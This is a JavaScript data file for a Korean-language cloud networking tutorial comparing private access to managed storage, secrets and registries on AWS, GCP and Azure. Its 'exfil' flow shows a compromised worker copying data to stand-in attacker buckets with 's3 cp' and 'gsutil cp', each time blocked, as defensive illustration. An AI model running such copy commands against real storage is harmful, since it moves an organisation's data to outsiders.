window.SCENARIO = {
  no: 20, level: 'network', title: '관리형 서비스로 가는 비공개 경로',
  lede: '인터넷 출구가 아예 없는 서브넷의 배치 워커가 오브젝트 스토리지, 시크릿, 컨테이너 레지스트리를 써야 합니다. 관리형 서비스는 VPC 밖에 있으니 어떻게든 닿을 길을 만들어야 합니다. AWS는 서비스마다 엔드포인트를 만들고, GCP는 서브넷 설정 하나로 모든 Google API에 닿으며, Azure는 리소스마다 Private Endpoint와 DNS 영역을 만듭니다. 그리고 그 길이 "우리 리소스로만" 이어지도록 막는 방법도 다릅니다.',
  region: {aws:'ap-northeast-2', gcp:'asia-northeast3', azure:'Korea Central'},
  req: [
    {k:'워커', v:'배치 컨테이너', s:'레지스트리에서 이미지를 받아 실행'},
    {k:'인터넷', v:'출구 없음', s:'NAT·공인 IP 없음'},
    {k:'필요한 서비스', v:'오브젝트 스토리지 · 시크릿 · 레지스트리', s:'모두 같은 리전'},
    {k:'반출 방지', v:'다른 회사 스토리지로 복사 금지', s:'자격 증명이 털려도'}
  ],
  intro: {
    arch: '<b>워커 → 이미지 받기</b>를 AWS에서 골라 보세요. 레지스트리 엔드포인트만 만들면 실패하는 이유가 보입니다. <b>워커 → 다른 회사 버킷</b>은 세 클라우드가 서로 다른 장치로 막습니다.'
  },

  diagram: {
    aws: { w: 700, h: 540, aria: 'AWS: 인터넷 출구 없는 VPC, S3 게이트웨이 엔드포인트와 Secrets Manager·ECR 인터페이스 엔드포인트',
      frames: [
        {id:'vpc', kind:'net', x:14, y:60, w:400, h:466, label:'vpc-batch 10.30.0.0/16 · IGW·NAT 없음', cfg:'vpc'},
        {id:'svc', kind:'plain', x:434, y:60, w:252, h:360, label:'리전 서비스 (우리 계정)'}
      ],
      nodes: [
        {id:'inet', x:470, y:6, w:200, h:40, t:'인터넷', kind:'alt'},
        {id:'vm', x:30, y:96, w:204, h:44, icon:'k8s', t:'배치 워커', s:'ECS on EC2 · 사설 IP', cfg:'vmgroup'},
        {id:'rt', kind:'chip', x:242, y:108, t:'rt: local · S3 → vpce', cfg:'route', why:'0.0.0.0/0 경로가 없습니다. 인터넷으로 가는 패킷은 여기서 갈 곳이 없어 버려집니다.'},
        {id:'eps3', x:30, y:186, w:204, h:44, icon:'privlink', t:'S3 게이트웨이 엔드포인트', s:'라우팅 테이블 · 무료', cfg:'privlink'},
        {id:'epol', kind:'chip', x:242, y:198, t:'정책: 우리 계정 버킷만', cfg:'privlink', why:'aws:ResourceAccount 조건으로 우리 계정의 버킷만 허용합니다. 다른 회사 버킷으로 가는 요청은 엔드포인트에서 거부됩니다.'},
        {id:'epsm', x:30, y:270, w:204, h:44, icon:'privlink', t:'secretsmanager 엔드포인트', s:'인터페이스 · ENI', cfg:'privlink'},
        {id:'epecr', x:30, y:350, w:204, h:44, icon:'privlink', t:'ecr.api · ecr.dkr 엔드포인트', s:'인터페이스 · ENI 2종', cfg:'privlink', why:'레지스트리 API와 Docker 레지스트리 엔드포인트 두 개가 필요합니다. 이미지 레이어는 S3에서 내려오므로 S3 게이트웨이 엔드포인트도 있어야 합니다.'},
        {id:'sgep', kind:'chip', x:242, y:310, t:'SG ← 워커:443', cfg:'firewall'},
        {id:'pdns', kind:'chip', x:30, y:420, t:'비공개 DNS 켬: 서비스 기본 이름 → 엔드포인트 IP', cfg:'dns', why:'인터페이스 엔드포인트의 비공개 DNS를 켜면 secretsmanager.ap-northeast-2.amazonaws.com이 엔드포인트의 사설 IP로 풀립니다. 앱 설정을 바꿀 필요가 없습니다.'},
        {id:'s3', x:448, y:96, w:226, h:44, icon:'obj', t:'우리 S3 버킷', s:'버킷 정책: aws:SourceVpce', cfg:'bucket'},
        {id:'sm', x:448, y:270, w:226, h:44, icon:'secret', t:'Secrets Manager', s:'DB 암호', cfg:'secret'},
        {id:'ecr', x:448, y:350, w:226, h:44, icon:'registry', t:'ECR 리포지토리', s:'레이어는 S3에 저장', cfg:'privlink'},
        {id:'extb', x:448, y:460, w:226, h:44, icon:'obj', t:'다른 회사 S3 버킷', s:'반출 시도 대상', kind:'alt'}
      ],
      edges: [{a:'eps3', b:'s3', dash:true}, {a:'epsm', b:'sm', dash:true}, {a:'epecr', b:'ecr', dash:true}]
    },

    gcp: { w: 700, h: 540, aria: 'GCP: 외부 IP와 Cloud NAT가 없는 VPC, 서브넷의 비공개 Google 액세스, VPC 서비스 제어 경계',
      frames: [
        {id:'vpc', kind:'net', x:14, y:60, w:400, h:466, label:'vpc-batch · Cloud NAT 없음', cfg:'vpc'},
        {id:'svc', kind:'group', x:434, y:60, w:252, h:360, label:'VPC 서비스 제어 경계', cfg:'guardrail'}
      ],
      nodes: [
        {id:'inet', x:470, y:6, w:200, h:40, t:'인터넷', kind:'alt'},
        {id:'vm', x:30, y:96, w:204, h:44, icon:'k8s', t:'배치 워커', s:'GKE 노드 · 외부 IP 없음', cfg:'vmgroup'},
        {id:'rt', kind:'chip', x:242, y:108, t:'0/0 → 기본 게이트웨이', cfg:'route', why:'기본 경로는 그대로 있지만, 외부 IP도 Cloud NAT도 없으므로 일반 인터넷 주소로는 나가지 못합니다. Google API 주소로 가는 트래픽만 비공개 Google 액세스가 처리합니다.'},
        {id:'eps3', x:30, y:186, w:204, h:44, icon:'privlink', t:'비공개 Google 액세스', s:'subnet-batch 설정 하나', kind:'reg', cfg:'privlink', why:'서브넷에서 켜면 외부 IP 없는 VM이 Cloud Storage, Secret Manager, Artifact Registry 같은 Google API 전체에 닿습니다. 서비스마다 엔드포인트를 만들지 않습니다.'},
        {id:'epol', kind:'chip', x:242, y:198, t:'restricted VIP (선택)', cfg:'dns', why:'VPC 서비스 제어를 쓰면 *.googleapis.com을 restricted.googleapis.com VIP(199.36.153.4/30)로 풀어 경계가 지원하는 API로만 가게 합니다.'},
        {id:'epsm', x:30, y:270, w:204, h:44, icon:'privlink', t:'(엔드포인트 불필요)', s:'Secret Manager도 같은 경로', kind:'ghost', cfg:'privlink'},
        {id:'epecr', x:30, y:350, w:204, h:44, icon:'privlink', t:'(엔드포인트 불필요)', s:'Artifact Registry도 같은 경로', kind:'ghost', cfg:'privlink'},
        {id:'sgep', kind:'chip', x:242, y:310, t:'이그레스 묵시적 허용', cfg:'firewall'},
        {id:'pdns', kind:'chip', x:30, y:420, t:'DNS: googleapis.com 기본 이름 그대로 (선택: 비공개 영역)', cfg:'dns'},
        {id:'s3', x:448, y:96, w:226, h:44, icon:'obj', t:'우리 Cloud Storage', s:'경계 안 프로젝트', cfg:'bucket'},
        {id:'sm', x:448, y:270, w:226, h:44, icon:'secret', t:'Secret Manager', s:'경계 안', cfg:'secret'},
        {id:'ecr', x:448, y:350, w:226, h:44, icon:'registry', t:'Artifact Registry', s:'경계 안', cfg:'privlink'},
        {id:'extb', x:448, y:460, w:226, h:44, icon:'obj', t:'다른 회사 버킷', s:'경계 밖 프로젝트', kind:'alt'}
      ],
      edges: [{a:'eps3', b:'s3', dash:true}, {a:'eps3', b:'sm', dash:true}, {a:'eps3', b:'ecr', dash:true}]
    },

    azure: { w: 700, h: 540, aria: 'Azure: 기본 아웃바운드를 끈 서브넷, 리소스마다 Private Endpoint와 privatelink DNS 영역, 공용 접근을 끈 스토리지·Key Vault·ACR',
      frames: [
        {id:'vpc', kind:'net', x:14, y:60, w:400, h:466, label:'vnet-batch · NAT 없음 · 기본 아웃바운드 끔', cfg:'vpc'},
        {id:'svc', kind:'plain', x:434, y:60, w:252, h:360, label:'리소스 (공용 네트워크 접근 끔)'}
      ],
      nodes: [
        {id:'inet', x:470, y:6, w:200, h:40, t:'인터넷', kind:'alt'},
        {id:'vm', x:30, y:96, w:204, h:44, icon:'k8s', t:'배치 워커', s:'AKS 노드 · 사설 IP', cfg:'vmgroup'},
        {id:'rt', kind:'chip', x:242, y:108, t:'프라이빗 서브넷', cfg:'subnet', why:'기본 아웃바운드 액세스를 끈 서브넷이고 NAT Gateway도 연결하지 않았습니다. 인터넷으로 나갈 방법이 없습니다.'},
        {id:'eps3', x:30, y:186, w:204, h:44, icon:'privlink', t:'PE: 스토리지 (blob)', s:'10.30.1.4', cfg:'privlink'},
        {id:'epol', kind:'chip', x:242, y:198, t:'리소스 하나에 PE 하나', cfg:'privlink', why:'Private Endpoint는 특정 스토리지 계정 하나에만 연결됩니다. 다른 계정으로 가는 길은 생기지 않습니다.'},
        {id:'epsm', x:30, y:270, w:204, h:44, icon:'privlink', t:'PE: Key Vault', s:'10.30.1.5', cfg:'privlink'},
        {id:'epecr', x:30, y:350, w:204, h:44, icon:'privlink', t:'PE: ACR (registry)', s:'레지스트리 + 지역 데이터 엔드포인트', cfg:'privlink', why:'ACR Private Endpoint는 레지스트리 주소와 지역별 데이터 엔드포인트 주소를 함께 만듭니다. 둘 다 DNS에 등록되어야 이미지 레이어를 받을 수 있습니다. Premium SKU가 필요합니다.'},
        {id:'sgep', kind:'chip', x:242, y:310, t:'NSG: VNet 허용', cfg:'firewall'},
        {id:'pdns', kind:'chip', x:30, y:420, t:'privatelink 영역 3개: blob · vaultcore · azurecr', cfg:'dns', why:'privatelink.blob.core.windows.net, privatelink.vaultcore.azure.net, privatelink.azurecr.io를 VNet에 연결합니다. 하나라도 빠지면 그 서비스 이름이 공용 IP로 풀립니다.'},
        {id:'s3', x:448, y:96, w:226, h:44, icon:'obj', t:'우리 스토리지 계정', s:'공용 접근 끔', cfg:'bucket'},
        {id:'sm', x:448, y:270, w:226, h:44, icon:'secret', t:'Key Vault', s:'공용 접근 끔', cfg:'secret'},
        {id:'ecr', x:448, y:350, w:226, h:44, icon:'registry', t:'Container Registry', s:'Premium · 공용 접근 끔', cfg:'privlink'},
        {id:'extb', x:448, y:460, w:226, h:44, icon:'obj', t:'다른 회사 스토리지', s:'공용 엔드포인트만', kind:'alt'}
      ],
      edges: [{a:'eps3', b:'s3', dash:true}, {a:'epsm', b:'sm', dash:true}, {a:'epecr', b:'ecr', dash:true}]
    }
  },

  flows: [
    {id:'obj', t:'워커 → 우리 오브젝트 스토리지',
     d:'워커가 입력 파일을 읽고 결과를 씁니다.',
     hops:{
      aws:[{n:'vm', t:'배치 워커', r:'s3.ap-northeast-2.amazonaws.com 으로 요청 (공인 IP 대역)'},
           {n:'rt', t:'rt-batch', r:'S3 접두사 목록 → vpce-s3 경로가 일치', cfg:'route'},
           {n:'eps3', t:'S3 게이트웨이 엔드포인트', r:'엔드포인트 정책: 우리 계정 버킷 허용', cfg:'privlink'},
           {n:'s3', t:'우리 S3 버킷', r:'버킷 정책 aws:SourceVpce = 이 엔드포인트, 역할 권한 확인', cfg:'bucket'}],
      gcp:[{n:'vm', t:'배치 워커', r:'storage.googleapis.com 으로 요청'},
           {n:'eps3', t:'비공개 Google 액세스', r:'외부 IP 없는 VM의 Google API 트래픽을 Google 네트워크 안에서 처리', cfg:'privlink'},
           {n:'s3', t:'우리 Cloud Storage', r:'서비스 계정 IAM 확인. 같은 VPC 서비스 제어 경계 안', cfg:'bucket'}],
      azure:[{n:'vm', t:'배치 워커', r:'stbatch.blob.core.windows.net 질의'},
           {n:'pdns', t:'privatelink.blob 영역', r:'CNAME을 따라 10.30.1.4로 풀림', cfg:'dns'},
           {n:'eps3', t:'PE: 스토리지', r:'VNet 안의 NIC', cfg:'privlink'},
           {n:'s3', t:'우리 스토리지 계정', r:'공용 접근 끔. PE 경유라 허용, 관리 ID에 Blob 데이터 역할', cfg:'bucket'}]
     }},
    {id:'img', t:'워커 → 컨테이너 이미지 받기',
     d:'워커가 레지스트리에서 배치 이미지를 받습니다.',
     hops:{
      aws:[{n:'vm', t:'배치 워커', r:'docker pull 계정.dkr.ecr.ap-northeast-2.amazonaws.com/batch'},
           {n:'pdns', t:'비공개 DNS', r:'ecr.api, ecr.dkr 이름이 엔드포인트 사설 IP로', cfg:'dns'},
           {n:'epecr', t:'ecr.api · ecr.dkr 엔드포인트', r:'인증 토큰과 이미지 매니페스트를 받음', cfg:'privlink'},
           {n:'ecr', t:'ECR', r:'레이어 다운로드 주소로 S3를 알려 줌', cfg:'privlink'},
           {n:'rt', t:'rt-batch', r:'S3 접두사 목록 → vpce-s3. 이 엔드포인트가 없으면 레이어 다운로드가 여기서 멈춤', cfg:'route'},
           {n:'eps3', t:'S3 게이트웨이 엔드포인트', r:'엔드포인트 정책에 ECR 레이어 버킷(prod-ap-northeast-2-starport-layer-bucket)도 허용해야 함', cfg:'privlink'}],
      gcp:[{n:'vm', t:'배치 워커', r:'docker pull asia-northeast3-docker.pkg.dev/...'},
           {n:'eps3', t:'비공개 Google 액세스', r:'*.pkg.dev도 같은 경로로 처리', cfg:'privlink'},
           {n:'ecr', t:'Artifact Registry', r:'노드 서비스 계정에 Artifact Registry 읽기 역할', cfg:'privlink'}],
      azure:[{n:'vm', t:'배치 워커', r:'docker pull crbatch.azurecr.io/batch'},
           {n:'pdns', t:'privatelink.azurecr.io', r:'레지스트리 주소와 crbatch.koreacentral.data.azurecr.io가 모두 사설 IP로', cfg:'dns'},
           {n:'epecr', t:'PE: ACR', r:'매니페스트와 레이어 모두 PE 경유', cfg:'privlink'},
           {n:'ecr', t:'Container Registry', r:'kubelet 관리 ID에 AcrPull', cfg:'privlink'}]
     },
     note:{aws:'가장 흔한 실패가 "ECR 엔드포인트는 만들었는데 pull이 멈춤"입니다. 레이어는 S3에서 오므로 S3 게이트웨이 엔드포인트와 그 정책이 필요합니다. 로그를 CloudWatch로 보낸다면 logs 엔드포인트도 필요합니다.', gcp:'서비스마다 엔드포인트를 만들지 않으므로 이 실패 유형이 없습니다.', azure:'데이터 엔드포인트 DNS 레코드가 빠지면 매니페스트는 받는데 레이어에서 실패합니다. 전용 데이터 엔드포인트 설정과 DNS 영역 그룹을 확인합니다.'}},
    {id:'secret', t:'워커 → 시크릿 읽기',
     d:'워커가 시작할 때 DB 암호를 읽습니다.',
     hops:{
      aws:[{n:'vm', t:'배치 워커', r:'secretsmanager.ap-northeast-2.amazonaws.com'},
           {n:'pdns', t:'비공개 DNS', r:'엔드포인트 사설 IP로 풀림', cfg:'dns'},
           {n:'sgep', t:'엔드포인트 보안 그룹', r:'443 ← 워커', cfg:'firewall'},
           {n:'epsm', t:'secretsmanager 엔드포인트', r:'', cfg:'privlink'},
           {n:'sm', t:'Secrets Manager', r:'태스크 역할에 GetSecretValue', cfg:'secret'}],
      gcp:[{n:'vm', t:'배치 워커', r:'secretmanager.googleapis.com'},
           {n:'eps3', t:'비공개 Google 액세스', r:'', cfg:'privlink'},
           {n:'sm', t:'Secret Manager', r:'Workload Identity로 받은 권한', cfg:'secret'}],
      azure:[{n:'vm', t:'배치 워커', r:'kv-batch.vault.azure.net'},
           {n:'pdns', t:'privatelink.vaultcore 영역', r:'10.30.1.5로', cfg:'dns'},
           {n:'epsm', t:'PE: Key Vault', r:'', cfg:'privlink'},
           {n:'sm', t:'Key Vault', r:'Workload ID에 Key Vault Secrets User', cfg:'secret'}]
     }},
    {id:'exfil', t:'워커 → 다른 회사 버킷 (반출)',
     d:'워커의 자격 증명이 털려, 공격자가 데이터를 자기 회사 버킷으로 복사하려 합니다.',
     hops:{
      aws:[{n:'vm', t:'배치 워커 (탈취됨)', r:'s3 cp → s3://attacker-bucket'},
           {n:'rt', t:'rt-batch', r:'S3 주소라 vpce-s3로 감 (인터넷 출구가 없어도 이 길은 열려 있음)', cfg:'route'},
           {n:'epol', t:'엔드포인트 정책', r:'aws:ResourceAccount가 우리 계정이 아님 → 거부', cfg:'privlink', ok:false},
           {n:'extb', t:'다른 회사 버킷', r:''}],
      gcp:[{n:'vm', t:'배치 워커 (탈취됨)', r:'gsutil cp → gs://attacker-bucket'},
           {n:'eps3', t:'비공개 Google 액세스', r:'Google API라 경로는 있음', cfg:'privlink'},
           {n:'svc', t:'VPC 서비스 제어 경계', r:'경계 밖 프로젝트의 리소스로 데이터 이동 → 거부', cfg:'guardrail', ok:false},
           {n:'extb', t:'다른 회사 버킷', r:''}],
      azure:[{n:'vm', t:'배치 워커 (탈취됨)', r:'attacker.blob.core.windows.net (공용 DNS로 공인 IP)'},
           {n:'rt', t:'snet-batch', r:'인터넷 출구 없음 → 공용 엔드포인트에 닿지 못함', cfg:'subnet', ok:false},
           {n:'extb', t:'다른 회사 스토리지', r:''}]
     },
     note:{aws:'게이트웨이 엔드포인트는 S3 전체로 가는 길이라, 정책이 없으면 다른 회사 버킷에도 그대로 갑니다. 엔드포인트 정책이 반출 방지의 핵심입니다.', gcp:'비공개 Google 액세스도 Google API 전체로 가는 길입니다. VPC 서비스 제어 경계가 반출을 막습니다. 처음에는 시험 실행 모드로 영향을 확인합니다.', azure:'Private Endpoint는 리소스 하나로만 가는 길이라 구조적으로 반출 경로가 생기지 않습니다. 대신 서비스 엔드포인트(Microsoft.Storage)를 켜 두면 모든 스토리지 계정으로 가는 길이 열리므로, 그때는 서비스 엔드포인트 정책으로 허용 계정을 묶어야 합니다.'}},
    {id:'inet', t:'워커 → 인터넷 (pip install)',
     d:'누군가 이미지 대신 컨테이너 안에서 패키지를 받으려 합니다.',
     hops:{
      aws:[{n:'vm', t:'배치 워커', r:'pypi.org (공인 IP)'},
           {n:'rt', t:'rt-batch', r:'0.0.0.0/0 경로 없음 → 버림', cfg:'route', ok:false},
           {n:'inet', t:'인터넷', r:''}],
      gcp:[{n:'vm', t:'배치 워커 (외부 IP 없음)', r:'pypi.org'},
           {n:'rt', t:'기본 경로', r:'경로는 있지만 외부 IP도 Cloud NAT도 없어 인터넷으로 나가지 못함', cfg:'route', ok:false},
           {n:'inet', t:'인터넷', r:''}],
      azure:[{n:'vm', t:'배치 워커', r:'pypi.org'},
           {n:'rt', t:'snet-batch', r:'기본 아웃바운드 끔, NAT 없음 → 나가지 못함', cfg:'subnet', ok:false},
           {n:'inet', t:'인터넷', r:''}]
     },
     note:'패키지는 빌드 단계에서 이미지에 넣거나, 사내 패키지 미러(Artifact Registry 원격 저장소, CodeArtifact, ACR 캐시 등)를 비공개 경로로 씁니다.'}
  ],

  scope: ['privlink','dns','bucket','secret','guardrail'],
  build: {
    aws: [
      {t:'VPC + 서브넷 (IGW·NAT 없음)', d:'라우팅 테이블에 0/0 없음', cfg:'vpc', nodes:['vpc','rt']},
      {t:'S3 게이트웨이 엔드포인트 + 정책', d:'우리 계정 버킷 + ECR 레이어 버킷', cfg:'privlink', nodes:['eps3','epol']},
      {t:'인터페이스 엔드포인트 보안 그룹', d:'443 ← 워커', cfg:'firewall', nodes:['sgep']},
      {t:'인터페이스 엔드포인트', d:'secretsmanager, ecr.api, ecr.dkr, logs, (sts)', cfg:'privlink', nodes:['epsm','epecr']},
      {t:'비공개 DNS 켜기', d:'VPC DNS 확인·호스트 이름 켜기 필요', cfg:'dns', nodes:['pdns']},
      {t:'버킷 정책', d:'aws:SourceVpce 조건', cfg:'bucket', nodes:['s3']}
    ],
    gcp: [
      {t:'VPC + 서브넷', d:'Cloud NAT 만들지 않음', cfg:'vpc', nodes:['vpc']},
      {t:'비공개 Google 액세스 켜기', d:'서브넷 설정', cfg:'privlink', nodes:['eps3']},
      {t:'서비스별 엔드포인트', d:'만들 것 없음', cfg:'privlink', nodes:['epsm','epecr'], auto:true},
      {t:'(선택) restricted.googleapis.com DNS', d:'비공개 영역 googleapis.com → 199.36.153.4/30', cfg:'dns', nodes:['epol','pdns']},
      {t:'VPC 서비스 제어 경계', d:'프로젝트와 API 지정, 시험 실행 → 적용', cfg:'guardrail', nodes:['svc']}
    ],
    azure: [
      {t:'VNet + 프라이빗 서브넷', d:'기본 아웃바운드 끔, NAT 연결 안 함', cfg:'subnet', nodes:['vpc','rt']},
      {t:'privatelink DNS 영역 3개 + VNet 연결', d:'blob, vaultcore, azurecr', cfg:'dns', nodes:['pdns']},
      {t:'PE: 스토리지', d:'하위 리소스 blob, DNS 영역 그룹', cfg:'privlink', nodes:['eps3']},
      {t:'PE: Key Vault', d:'', cfg:'privlink', nodes:['epsm']},
      {t:'PE: ACR (Premium)', d:'registry, 데이터 엔드포인트', cfg:'privlink', nodes:['epecr']},
      {t:'각 리소스 공용 네트워크 접근 끄기', d:'', cfg:'bucket', nodes:['s3','sm','ecr']}
    ]
  },

  map: ['private-endpoint','object-storage','secrets','container-registry','data-perimeter'],

  decisions: [
    {t:'관리형 서비스로 가는 길을 무엇 단위로 만드는가',
     p:'이 선택이 만들 리소스 수, DNS 작업, 반출 방지 방법을 함께 정합니다.',
     aws:'서비스마다 엔드포인트입니다. S3·DynamoDB는 게이트웨이(라우팅), 나머지는 인터페이스(ENI). 쓰는 서비스가 늘수록 엔드포인트와 시간 요금이 늘어납니다.',
     gcp:'서브넷 설정 하나(비공개 Google 액세스)로 Google API 전체입니다. 고정 IP가 필요하면 PSC 엔드포인트로 googleapis 묶음을 받아 옵니다.',
     azure:'리소스(계정·볼트·레지스트리)마다 Private Endpoint입니다. 서비스 종류가 아니라 리소스 수만큼 늘어납니다. 서비스 엔드포인트는 서브넷 단위의 더 가벼운 대안입니다.',
     so:'단위가 클수록(GCP) 만들 것이 적고 반출 통제는 별도 장치가 필요하며, 단위가 작을수록(Azure) 만들 것이 많지만 구조적으로 안전합니다. AWS는 그 중간입니다.'},
    {t:'DNS는 누가 바꾸는가',
     p:'앱은 서비스의 기본 이름(공용 이름)을 그대로 씁니다. 그 이름이 사설 IP로 풀려야 비공개 경로를 탑니다.',
     aws:'인터페이스 엔드포인트의 "비공개 DNS"를 켜면 VPC 안에서 기본 이름이 엔드포인트 IP로 풀립니다. 게이트웨이 엔드포인트는 DNS가 아니라 라우팅으로 동작합니다.',
     gcp:'비공개 Google 액세스는 기본 이름 그대로 동작합니다. restricted·private VIP를 쓰려면 googleapis.com 비공개 영역을 직접 만듭니다.',
     azure:'privatelink.* 비공개 DNS 영역을 만들어 VNet에 연결하고 Private Endpoint의 DNS 영역 그룹으로 레코드를 자동 등록합니다. 하이브리드라면 사내 DNS도 이 영역을 보게 해야 합니다.',
     so:'Azure는 DNS 영역 관리가 설계의 큰 부분입니다. 허브에 영역을 모아 두고 Azure Policy로 레코드 등록을 자동화하는 패턴이 일반적입니다.'},
    {t:'반출은 무엇으로 막는가',
     p:'출구를 막아도 관리형 서비스로 가는 길은 열려 있어야 합니다. 그 길로 데이터가 나가는 것을 막는 장치가 다릅니다.',
     aws:'엔드포인트 정책(aws:ResourceAccount, aws:ResourceOrgID)과 버킷 정책(aws:SourceVpce)의 양방향 조건입니다.',
     gcp:'VPC 서비스 제어 경계입니다. 경계 안 프로젝트의 리소스끼리만 데이터가 움직이게 합니다.',
     azure:'Private Endpoint는 리소스 하나로만 가는 길이라 그 자체로 반출 경로가 없습니다. 서비스 엔드포인트를 쓰면 서비스 엔드포인트 정책이 필요합니다.',
     so:'세 방식 모두 "네트워크로 막기"보다 "리소스 소유자 조건으로 막기"에 가깝습니다. 출구 방화벽(시나리오 09)과 함께 씁니다.'}
  ],

  iac: 'iac/scenario-20',
  checklist: [
    ['AWS ECR 엔드포인트만 만든다','레이어는 S3에서 옵니다. S3 게이트웨이 엔드포인트와 정책에 레이어 버킷을 넣습니다.'],
    ['AWS 인터페이스 엔드포인트 비공개 DNS를 끈다','기본 이름이 공인 IP로 풀려 출구가 없는 서브넷에서 실패합니다.'],
    ['게이트웨이 엔드포인트 정책을 기본(전체 허용)으로 둔다','다른 회사 버킷으로 가는 길이 됩니다.'],
    ['GCP에서 서브넷마다 비공개 Google 액세스를 켜지 않는다','서브넷 단위 설정이라 새 서브넷에서 빠뜨리기 쉽습니다.'],
    ['VPC 서비스 제어를 바로 적용한다','쓰던 연동이 한꺼번에 막힐 수 있습니다. 시험 실행 로그를 먼저 봅니다.'],
    ['Azure privatelink DNS 영역을 VNet마다 따로 만든다','레코드가 흩어져 일부 VNet에서만 공용 IP로 풀립니다. 허브에 모아 연결합니다.'],
    ['Azure Private Endpoint를 만들고 공용 접근을 끄지 않는다','PE가 있어도 공용 엔드포인트는 열려 있습니다.']
  ],
  refs: [
    ['AWS: 게이트웨이 엔드포인트','https://docs.aws.amazon.com/vpc/latest/privatelink/gateway-endpoints.html'],
    ['AWS: ECR 인터페이스 엔드포인트','https://docs.aws.amazon.com/AmazonECR/latest/userguide/vpc-endpoints.html'],
    ['Google Cloud: 비공개 Google 액세스','https://cloud.google.com/vpc/docs/private-google-access'],
    ['Google Cloud: VPC 서비스 제어','https://cloud.google.com/vpc-service-controls/docs/overview'],
    ['Azure: Private Endpoint DNS 구성','https://learn.microsoft.com/azure/private-link/private-endpoint-dns'],
    ['Azure: 서비스 엔드포인트 정책','https://learn.microsoft.com/azure/virtual-network/virtual-network-service-endpoint-policies-overview']
  ],
  next: '시나리오 01부터 다시 읽으며 각 장의 통신 경로를 이 장의 방법으로 비공개화해 보세요'
};
